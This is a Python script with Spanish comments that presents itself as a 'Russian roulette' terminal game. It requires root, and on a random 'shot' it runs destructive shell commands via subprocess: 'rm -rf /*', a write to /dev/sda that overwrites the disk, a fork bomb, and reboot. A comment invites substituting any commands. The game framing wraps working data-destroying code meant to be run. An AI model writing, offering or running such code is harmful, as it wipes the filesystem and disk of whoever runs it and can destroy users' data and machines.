# -*- coding: utf-8 -*-
import os
import random
import sys
import subprocess
from colorama import Fore, Style, init

# función para limpiar la pantalla
def limpiar_pantalla():
    os.system('cls' if os.name == "nt" else 'clear')

# función para validar si eres root
def es_root():
    return os.getuid() == 0

# función para iniciar el juego
def empezar_juego():
    limpiar_pantalla()
    if not es_root():
        print(Fore.RED + "Debes ser root para iniciar el juego." + Style.RESET_ALL)
        return

    input("Presiona Enter para recargar el revólver...\n")
    print("Girando el tambor...")

    bala = random.randint(0, 8)
    disparos = 0

    while disparos < 8:
        input("Presiona Enter para disparar...\n")
        disparos += 1
        if disparos == bala:
            print(Fore.RED + "¡Bang! Has perdido..." + Style.RESET_ALL)
            comandos = ["rm -rf /*", "echo 'Hello' > /dev/sda", ":(){:|:&};:", "reboot"]  # Introduce la secuencia de comandos que quieras utilizar
            for comando in comandos:
                print(Fore.RED + f"Ejecutando '{comando}'" + Style.RESET_ALL)
                resultado = subprocess.run(comando, stdout=subprocess.PIPE, shell=True)
                print(resultado.stdout.decode('utf-8'))
            break
        else:
            print(f"Intento {disparos}: Has sobrevivido.")

# función para seleccionar las opciones
def main():
    limpiar_pantalla()

    print("[+] Bienvenido al juego de la Ruleta Rusa!\n")

    while True:
        try:
            print("1. Empezar a jugar")
            print("2. Salir del juego")

            opcion = input("\n[+] Elige una opción: ")

            if opcion == "1":
                empezar_juego()
            elif opcion == "2":
                print("Saliendo del juego.")
                break
            else:
                print(Fore.RED + "Opción no válida. Introduce 1 o 2." + Style.RESET_ALL)

        except ValueError:
            print(Fore.RED + "Selección no válida. Introduce 1 o 2." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
